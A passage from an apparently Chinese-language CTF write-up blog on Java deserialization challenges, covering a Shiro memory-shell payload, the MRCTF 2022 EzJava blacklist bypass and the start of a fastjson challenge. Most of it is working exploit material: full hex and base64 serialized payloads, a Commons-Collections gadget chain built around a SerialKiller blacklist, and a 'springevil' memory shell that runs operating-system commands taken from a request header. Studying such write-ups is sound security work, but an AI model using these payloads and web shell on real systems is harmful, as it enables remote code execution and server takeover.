575a735a574e304c304e76626e4e30636e566a644739794f77454148577068646d4576624746755a7939795a575a735a574e304c304e76626e4e30636e566a644739794151414c626d56335357357a64474675593255424143636f5730787159585a684c327868626d637654324a715a574e304f796c4d616d4632595339735957356e4c303969616d566a6444734241414e77645851424144676f54477068646d4576624746755a793950596d706c5933513754477068646d4576624746755a793950596d706c593351374b55787159585a684c327868626d637654324a715a574e304f77416841444941537741424145774141414148414145415451424f414145415477414141433841415141424141414142537133414147784141414141674251414141414267414241414141474142524141414144414142414141414251425341464d4141414142414651415651414341453841414141314141414141674141414147784141414141674251414141414267414241414141546742524141414146674143414141414151425341464d414141414141414541566742584141454157414141414151414151425a41414541576742624141494154774141415a41414277414a41414141705376414141493642426b4545674f3541415143414d59416a62734142566b477651414757514d5342314e5a4242494955316b464751515343626b41424149415537634143725941437a6f467577414d5762734144566b5a42625941447263414437634145446f4741546f487577415257626341456a6f494751613241424e5a4f67664741434d5a434c734146466d334142555a423759414668495875414159746741577467415a746741615636662f3243793541427342414c7341426c6b5a434c6341484c594148526b4674674165735330724c4c6b4148774d417351414141414d41554141414144594144514141414649414267425441424941564141344146594154514258414641415741425a41466b415a4142614149514158514357414634416d774266414a77415951436b414749415551414141467741435141344147514158414264414155415451425041463441587741474146414154414267414745414277425a41454d415967426a414167414141436c4146494155774141414141417051426b4147554141514141414b55415a67426e414149414141436c4147674161514144414159416e7742714147734142414273414141414f7741442f77425a41416b4841473048414734484147384841484148414845484148494841484d4841485148414855414143722f414263414251634162516341626763416277634163416341635141414146674141414147414149416467425a414145416477424f414145415477414141437341414141424141414141624541414141434146414141414147414145414141426e414645414141414d4141454141414142414649415577414141414541654142354141494154774141414438414141414441414141416245414141414341464141414141474141454141414273414645414141416741414d414141414241464941557741414141414141514236414873414151414141414541664142394141494157414141414151414151422b414145416541422f414149415477414141456b414141414541414141416245414141414341464141414141474141454141414278414645414141417141415141414141424146494155774141414141414151423641487341415141414141454167414342414149414141414241494941677741444146674141414145414145416667414941495141546741424145384141414a354141554144414141415179374142525a7477415645694332414261344143473241434b3241426c4c45694e4d7541416b7467416c7741416d545379324143653541436742414d41414b5534424f67517474674171746741724f67515a424249737467417456366341457a6f464c6259414b6a6f45475151534c4c59414c56635a42424973746741744f67555a425153324143385a425332324144444141444536427273414d6c6d3341444d36423773414e466d334144553643426b49475165324144595a434371324144635a43426b487467417174674134746741354c526b4974674136757741375762634150446f4a47516b534937594150526b4a4b72594150686b4a7367412f74674241746742424c526b4a74674243456b4d467651424557514d5352564e5a4242493055375941526a6f4b47516f457467424847516f467651424957514d7455316b45475168547467424a774142444f67735a42696f5a43376b4153674d415636634142457578414149414d774245414563414c674141415163424367417541415141554141414149494149414141414273414667416341426b414877416a414341414d41416941444d414a4141384143554152414170414563414a67424a414363415477416f414663414b674267414373415a674173414845414c674236414441416777417841496f414d67435141444d416e514133414b4d414f51437341446f4173774137414c6b41504144454144344179674241414e38415151446c414549412f414245415163415277454b41455542437742494146454141414345414130415351414f41495541686741464142594138514348414745414141415a414f344169414268414145414977446b41496b4169674143414441413177434c414977414177417a414e51416a51434f414151415941436e414938416b414146414845416c674352414a494142674236414930416b7742544141634167774345414a51416c514149414b774157774357414a634143514466414367416d41435a41416f412f41414c414659416d67414c414a73414141414d414145414d774455414930416e414145414777414141416e4141542f414563414251634164416341644163416e5163416e6763416e77414242774367442f38417367414141414548414b4141414145416f514141414149416f6e423041415268595746686348634241486831636741535730787159585a684c6d7868626d63755132786863334d37717862587273764e57706b4341414234634141414141463263674164616d463259586775654731734c6e52795957357a5a6d3979625335555a573177624746305a584d414141414141414141414141414148687763334541666741415030414141414141414178334341414141424141414141416548683041414e69596d4a3470787372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d6571007e000b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b787070740007636f6e6e656374707371007e00003f4000000000000c77080000001000000000787874000362626278
+</code></pre>
+<p>最后在basic路由通过，post传入data参数，就注入内存马了</p>
+<figure data-type="image" tabindex="19"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220430153905006.png" alt="image-20220430153905006" loading="lazy"></figure>
+<figure data-type="image" tabindex="20"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220430153830561.png" alt="image-20220430153830561" loading="lazy"></figure>
+<pre><code class="language-flag">0ops{shiro_deserialize_in_internal_network}
+</code></pre>
+<h4 id="参考">参考</h4>
+<p>http://pipinstall.cn/2021/10/01/TCTF2021%E6%80%BB%E5%86%B3%E8%B5%9B2%E8%A7%A3Java%E4%B8%8EBypass%20Shiro550%20ClassLoader.loadClass/</p>
+<p>https://www.bilibili.com/video/BV1LZ4y1m7Ah?spm_id_from=333.1007.top_right_bar_window_history.content.click</p>
+<h2 id="2022年">2022年</h2>
+<h3 id="mrctf-2022ezjava">[MRCTF 2022]EzJava</h3>
+<p>题目给了一个<code>app.jar</code>和一个<code>serialkiller.xml</code>，这个白名单限制在<code>羊城杯2020</code>也见到过。</p>
+<h4 id="jar目录结构">jar目录结构</h4>
+<figure data-type="image" tabindex="21"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220427090001350.png" alt="image-20220427090001350" loading="lazy"></figure>
+<p>其中有两个路由，分别是<code>FileController</code>和<code>HelloController</code></p>
+<h4 id="filecontroller">FileController</h4>
+<pre><code class="language-java">package BOOT-INF.classes.com.example.easyjava.controller;
+
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileReader;
+import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.PostMapping;
+import org.springframework.web.bind.annotation.RequestBody;
+import org.springframework.web.bind.annotation.RestController;
+
+@RestController
+public class FileController {
+  @GetMapping({&quot;/file&quot;})
+  public String index() {
+    return &quot;&quot;;
+  }
+  
+  @PostMapping({&quot;/file&quot;})
+  public String index(@RequestBody String path) throws Exception {
+    File file = new File(path);
+    BufferedReader br = new BufferedReader(new FileReader(file));
+    String string = &quot;&quot;;
+    if (br.readLine() != null)
+      string = br.readLine(); 
+    br.close();
+    return string;
+  }
+}
+</code></pre>
+<h4 id="hellocontroller">HelloController</h4>
+<pre><code class="language-java">package BOOT-INF.classes.com.example.easyjava.controller;
+
+import java.io.ByteArrayInputStream;
+import java.util.Base64;
+import org.nibblesec.tools.SerialKiller;
+import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.PostMapping;
+import org.springframework.web.bind.annotation.RequestBody;
+import org.springframework.web.bind.annotation.RestController;
+
+@RestController
+public class HelloController {
+  @GetMapping({&quot;/hello&quot;})
+  public String index() {
+    return &quot;hello&quot;;
+  }
+  
+  @PostMapping({&quot;/hello&quot;})
+  public String index(@RequestBody String baseStr) throws Exception {
+    byte[] decode = Base64.getDecoder().decode(baseStr);
+    SerialKiller serialKiller = new SerialKiller(new ByteArrayInputStream(decode), &quot;serialkiller.xml&quot;);
+    serialKiller.readObject();
+    return &quot;hello&quot;;
+  }
+}
+</code></pre>
+<p>第一个路由<code>FileController</code>就是一个任意文件读取，在POST请求的body里传入路径，然后把读取的第一行回显</p>
+<figure data-type="image" tabindex="22"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220427091413889.png" alt="image-20220427091413889" loading="lazy"></figure>
+<p>第二个路由<code>HelloController</code>是对POST请求的body传入的字符进行base64解码，然后通过<code>SerialKiller</code>类来进行一个过滤，如果没有被拦截的话，就会直接进行一个反序列化的操作。</p>
+<h4 id="serialkillerxml">serialkiller.xml</h4>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!-- serialkiller.conf --&gt;
+&lt;config&gt;
+    &lt;refresh&gt;6000&lt;/refresh&gt;
+    &lt;mode&gt;
+        &lt;!-- set to 'false' for blocking mode --&gt;
+        &lt;profiling&gt;false&lt;/profiling&gt;
+    &lt;/mode&gt;
+    &lt;logging&gt;
+        &lt;enabled&gt;false&lt;/enabled&gt;
+    &lt;/logging&gt;
+    &lt;blacklist&gt;
+        &lt;!-- ysoserial's CommonsCollections1,3,5,6 payload  --&gt;
+        &lt;regexp&gt;org\.apache\.commons\.collections\.Transformer$&lt;/regexp&gt;
+        &lt;regexp&gt;org\.apache\.commons\.collections\.functors\.InvokerTransformer$&lt;/regexp&gt;
+        &lt;regexp&gt;org\.apache\.commons\.collections\.functors\.ChainedTransformer$&lt;/regexp&gt;
+        &lt;regexp&gt;org\.apache\.commons\.collections\.functors\.ConstantTransformer$&lt;/regexp&gt;
+        &lt;regexp&gt;org\.apache\.commons\.collections\.functors\.InstantiateTransformer$&lt;/regexp&gt;
+        &lt;!-- ysoserial's CommonsCollections2,4 payload  --&gt;
+        &lt;regexp&gt;org\.apache\.commons\.collections4\.functors\.InvokerTransformer$&lt;/regexp&gt;
+        &lt;regexp&gt;org\.apache\.commons\.collections4\.functors\.ChainedTransformer$&lt;/regexp&gt;
+        &lt;regexp&gt;org\.apache\.commons\.collections4\.functors\.ConstantTransformer$&lt;/regexp&gt;
+        &lt;regexp&gt;org\.apache\.commons\.collections4\.functors\.InstantiateTransformer$&lt;/regexp&gt;
+        &lt;regexp&gt;org\.apache\.commons\.collections4\.comparators\.TransformingComparator$&lt;/regexp&gt;
+    &lt;/blacklist&gt;
+    &lt;whitelist&gt;
+        &lt;regexp&gt;.*&lt;/regexp&gt;
+    &lt;/whitelist&gt;
+&lt;/config&gt;
+</code></pre>
+<p>serialkiller是直接载入配置获得黑白名单，通过resolveClass做了过滤</p>
+<h4 id="bypass-blacklist">Bypass blacklist</h4>
+<p>我们可以用一些黑名单以外的类来替换，例如</p>
+<ul>
+<li>
+<p><code>org.apache.commons.collections.functors.ConstantFactory#create</code>可以返回任意值代替<code>ConstantTransformer</code></p>
+</li>
+<li>
+<p><code>org.apache.commons.collections.functors.InstantiateFactory#create</code>可以实例化任意类代替<code>InstantiateTransformer</code>去实例化对象</p>
+</li>
+</ul>
+<p>TrAXFilter的构造函数当中可以帮助我们触发TemplatesImpl字节码加载的过程</p>
+<figure data-type="image" tabindex="23"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220427093453104.png" alt="image-20220427093453104" loading="lazy"></figure>
+<h4 id="gadget">Gadget</h4>
+<figure data-type="image" tabindex="24"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220427095926781.png" alt="image-20220427095926781" loading="lazy"></figure>
+<pre><code class="language-java">package com.le1a.web.MRCTF;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassPool;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.FactoryTransformer;
+import org.apache.commons.collections.functors.InstantiateFactory;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+import org.nibblesec.tools.SerialKiller;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.Base64;
+
+public class Exp {
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    public static void main(String[] args) throws Exception{
+
+        TemplatesImpl obj = new TemplatesImpl();
+        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]{
+                ClassPool.getDefault().get(springevil.class.getName()).toBytecode()
+        });
+        setFieldValue(obj, &quot;_name&quot;, &quot;1&quot;);
+        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+        InstantiateFactory instantiateFactory;
+        instantiateFactory = new InstantiateFactory(com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class
+                ,new Class[]{javax.xml.transform.Templates.class},new Object[]{obj});
+
+        FactoryTransformer factoryTransformer = new FactoryTransformer(instantiateFactory);
+
+        ConstantTransformer constantTransformer = new ConstantTransformer(1);
+
+        Map innerMap = new HashMap();
+        LazyMap outerMap = (LazyMap)LazyMap.decorate(innerMap, constantTransformer);
+
+        TiedMapEntry tme = new TiedMapEntry(outerMap, &quot;keykey&quot;);
+
+        Map expMap = new HashMap();
+        expMap.put(tme, &quot;valuevalue&quot;);
+        setFieldValue(outerMap,&quot;factory&quot;,factoryTransformer);
+
+        outerMap.remove(&quot;keykey&quot;);
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(expMap);
+
+
+        byte[] payload = byteArrayOutputStream.toByteArray();
+        String finalPayload = Base64.getEncoder().encodeToString(payload);
+        System.out.println(finalPayload);
+
+
+
+    }
+}
+</code></pre>
+<p>内存马springevil</p>
+<pre><code class="language-java">package com.le1a.web.MRCTF;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import java.lang.reflect.Method;
+import java.util.Scanner;
+
+public class springevil extends AbstractTranslet
+{
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+    public springevil() throws Exception{
+        Class c = Thread.currentThread().getContextClassLoader().loadClass(&quot;org.springframework.web.context.request.RequestContextHolder&quot;);
+        Method m = c.getMethod(&quot;getRequestAttributes&quot;);
+        Object o = m.invoke(null);
+        c = Thread.currentThread().getContextClassLoader().loadClass(&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;);
+        m = c.getMethod(&quot;getResponse&quot;);
+        Method m1 = c.getMethod(&quot;getRequest&quot;);
+        Object resp = m.invoke(o);
+        Object req = m1.invoke(o); // HttpServletRequest
+        Method getWriter = Thread.currentThread().getContextClassLoader().loadClass(&quot;javax.servlet.ServletResponse&quot;).getDeclaredMethod(&quot;getWriter&quot;);
+        Method getHeader = Thread.currentThread().getContextClassLoader().loadClass(&quot;javax.servlet.http.HttpServletRequest&quot;).getDeclaredMethod(&quot;getHeader&quot;,String.class);
+        getHeader.setAccessible(true);
+        getWriter.setAccessible(true);
+        Object writer = getWriter.invoke(resp);
+        String cmd = (String)getHeader.invoke(req, &quot;cmd&quot;);
+        String[] commands = new String[3];
+        String charsetName = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? &quot;GBK&quot;:&quot;UTF-8&quot;;
+        if (System.getProperty(&quot;os.name&quot;).toUpperCase().contains(&quot;WIN&quot;)) {
+            commands[0] = &quot;cmd&quot;;
+            commands[1] = &quot;/c&quot;;
+        } else {
+            commands[0] = &quot;/bin/sh&quot;;
+            commands[1] = &quot;-c&quot;;
+        }
+        commands[2] = cmd;
+        writer.getClass().getDeclaredMethod(&quot;println&quot;, String.class).invoke(writer, new Scanner(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter(&quot;\\A&quot;).next());
+        writer.getClass().getDeclaredMethod(&quot;flush&quot;).invoke(writer);
+        writer.getClass().getDeclaredMethod(&quot;close&quot;).invoke(writer);
+    }
+}
+</code></pre>
+<p>运行得到payload</p>
+<pre><code>rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAAGa2V5a2V5c3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkZhY3RvcnlUcmFuc2Zvcm1lcqFiwSldt/O4AgABTAAIaUZhY3Rvcnl0AChMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL0ZhY3Rvcnk7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkluc3RhbnRpYXRlRmFjdG9yeZSxnJ5nIQTrAgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAATaUNsYXNzVG9JbnN0YW50aWF0ZXQAEUxqYXZhL2xhbmcvQ2xhc3M7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAQTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAADm/K/rq+AAAANAC5CgAvAF8KAGAAYQoAYABiCABjCgBkAGUIAGYHAGcKAAcAaAcAaQoAagBrCABsCABtCABuCABvCABNCgAHAHAIAHEIAE4HAHIKAGoAcwgAUAgAdAoAdQB2CgATAHcIAHgKABMAeQgAeggAewoAEwB8CAB9CAB+CAB/CACACgAJAIEIAIIHAIMKAIQAhQoAhACGCgCHAIgKACQAiQgAigoAJACLCgAkAIwIAI0IAI4HAI8HAJABAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAH0xjb20vbGUxYS93ZWIvTVJDVEYvc3ByaW5nZXZpbDsBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAkQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAGPGluaXQ+AQADKClWAQABYwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQABbQEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQABbwEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAAm0xAQAEcmVzcAEAA3JlcQEACWdldFdyaXRlcgEACWdldEhlYWRlcgEABndyaXRlcgEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbW1hbmRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAC2NoYXJzZXROYW1lAQANU3RhY2tNYXBUYWJsZQcAjwcAZwcAkgcAaQcAcgcAUwcAkwEAClNvdXJjZUZpbGUBAA9zcHJpbmdldmlsLmphdmEMAEIAQwcAlAwAlQCWDACXAJgBADxvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5jb250ZXh0LnJlcXVlc3QuUmVxdWVzdENvbnRleHRIb2xkZXIHAJkMAJoAmwEAFGdldFJlcXVlc3RBdHRyaWJ1dGVzAQAPamF2YS9sYW5nL0NsYXNzDACcAJ0BABBqYXZhL2xhbmcvT2JqZWN0BwCSDACeAJ8BAEBvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5jb250ZXh0LnJlcXVlc3QuU2VydmxldFJlcXVlc3RBdHRyaWJ1dGVzAQALZ2V0UmVzcG9uc2UBAApnZXRSZXF1ZXN0AQAdamF2YXguc2VydmxldC5TZXJ2bGV0UmVzcG9uc2UMAKAAnQEAJWphdmF4LnNlcnZsZXQuaHR0cC5IdHRwU2VydmxldFJlcXVlc3QBABBqYXZhL2xhbmcvU3RyaW5nDAChAKIBAAdvcy5uYW1lBwCjDACkAKUMAKYApwEABndpbmRvdwwAqACpAQADR0JLAQAFVVRGLTgMAKoApwEAA1dJTgEAAi9jAQAHL2Jpbi9zaAEAAi1jDACrAKwBAAdwcmludGxuAQARamF2YS91dGlsL1NjYW5uZXIHAK0MAK4ArwwAsACxBwCyDACzALQMAEIAtQEAAlxBDAC2ALcMALgApwEABWZsdXNoAQAFY2xvc2UBAB1jb20vbGUxYS93ZWIvTVJDVEYvc3ByaW5nZXZpbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldERlY2xhcmVkTWV0aG9kAQANc2V0QWNjZXNzaWJsZQEABChaKVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAC3RvVXBwZXJDYXNlAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBACooTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvbGFuZy9TdHJpbmc7KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0ACEALgAvAAAAAAADAAEAMAAxAAIAMgAAAD8AAAADAAAAAbEAAAACADMAAAAGAAEAAAAQADQAAAAgAAMAAAABADUANgAAAAAAAQA3ADgAAQAAAAEAOQA6AAIAOwAAAAQAAQA8AAEAMAA9AAIAMgAAAEkAAAAEAAAAAbEAAAACADMAAAAGAAEAAAAVADQAAAAqAAQAAAABADUANgAAAAAAAQA3ADgAAQAAAAEAPgA/AAIAAAABAEAAQQADADsAAAAEAAEAPAABAEIAQwACADIAAALDAAkADQAAAXsqtwABuAACtgADEgS2AAVMKxIGA70AB7YACE0sAQO9AAm2AApOuAACtgADEgu2AAVMKxIMA70AB7YACE0rEg0DvQAHtgAIOgQsLQO9AAm2AAo6BRkELQO9AAm2AAo6BrgAArYAAxIOtgAFEg8DvQAHtgAQOge4AAK2AAMSEbYABRISBL0AB1kDEhNTtgAQOggZCAS2ABQZBwS2ABQZBxkFA70ACbYACjoJGQgZBgS9AAlZAxIVU7YACsAAEzoKBr0AEzoLEha4ABe2ABgSGbYAGpkACBIbpwAFEhw6DBIWuAAXtgAdEh62ABqZABIZCwMSFVMZCwQSH1OnAA8ZCwMSIFMZCwQSIVMZCwUZClMZCbYAIhIjBL0AB1kDEhNTtgAQGQkEvQAJWQO7ACRZuAAlGQu2ACa2ACcZDLcAKBIptgAqtgArU7YAClcZCbYAIhIsA70AB7YAEBkJA70ACbYAClcZCbYAIhItA70AB7YAEBkJA70ACbYAClexAAAAAwAzAAAAbgAbAAAAFgAEABcAEAAYABsAGQAlABoAMQAbADwAHABIAB0AUwAeAF8AHwB1ACAAkAAhAJYAIgCcACMAqQAkAL4AJQDEACYA3QAnAO0AKADzACkA/AArAQIALAEIAC4BDgAvAUoAMAFiADEBegAyADQAAACEAA0AAAF7ADUANgAAABABawBEAEUAAQAbAWAARgBHAAIAJQFWAEgASQADAEgBMwBKAEcABABTASgASwBJAAUAXwEcAEwASQAGAHUBBgBNAEcABwCQAOsATgBHAAgAqQDSAE8ASQAJAL4AvQBQAFEACgDEALcAUgBTAAsA3QCeAFQAUQAMAFUAAAA4AAT/ANkADAcAVgcAVwcAWAcAWQcAWAcAWQcAWQcAWAcAWAcAWQcAWgcAWwAAQQcAWvwAIAcAWgsAOwAAAAQAAQBcAAEAXQAAAAIAXnB0AAExcHcBAHh2cgA3Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVHJBWEZpbHRlcgAAAAAAAAAAAAAAeHB1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAF2cgAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXMAAAAAAAAAAAAAAHhwc3EAfgAAP0AAAAAAAAx3CAAAABAAAAAAeHh0AAp2YWx1ZXZhbHVleA==
+</code></pre>
+<figure data-type="image" tabindex="25"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220427100307891.png" alt="image-20220427100307891" loading="lazy"></figure>
+<h3 id="蓝帽杯-2022ez_gadget">[蓝帽杯 2022]Ez_gadget</h3>
+<p>题目给了附件，jd-gui反编译一下，主要的代码如下:</p>
+<pre><code class="language-java">package com.example.spring;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+import com.example.spring.secret;
+import java.util.Objects;
+import java.util.regex.Pattern;
+import org.springframework.stereotype.Controller;
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.RequestParam;
+import org.springframework.web.bind.annotation.ResponseBody;
+
+@Controller
+public class JSONController {
+    @ResponseBody
+    @RequestMapping({&quot;/&quot;})
+    public String hello() {
+        return &quot;Your key is:&quot; + secret.getKey();
+    }
+
+    @ResponseBody
+    @RequestMapping({&quot;/json&quot;})
+    public String Unserjson(@RequestParam String str, @RequestParam String input) throws Exception {
+        if (str != null &amp;&amp;
+                Objects.hashCode(str) == secret.getKey().hashCode() &amp;&amp; !secret.getKey().equals(str)) {
+            String pattern = &quot;.*rmi.*|.*jndi.*|.*ldap.*|.*\\\\x.*&quot;;
+            Pattern p = Pattern.compile(pattern, 2);
+            boolean StrMatch = p.matcher(input).matches();
+            if (StrMatch)
+                return &quot;Hacker get out!!!&quot;;
+            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
